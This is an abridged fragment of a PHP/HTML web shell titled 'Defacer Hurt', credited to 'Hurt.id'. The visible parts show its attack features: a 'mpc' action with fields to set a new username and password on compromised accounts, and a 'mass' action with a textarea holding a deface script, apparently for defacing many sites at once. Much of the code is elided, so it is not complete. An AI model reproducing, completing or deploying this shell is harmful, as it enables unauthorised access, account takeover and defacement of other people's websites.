...
<html>
<head>
<title>Defacer Hurt</title>
<meta name='author' content='Hurt.id'>
<meta charset="UTF-8">
<style type='text/css'>
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='hurt.id' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='hurt.id' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Defacer Hurt.id</textarea><br>
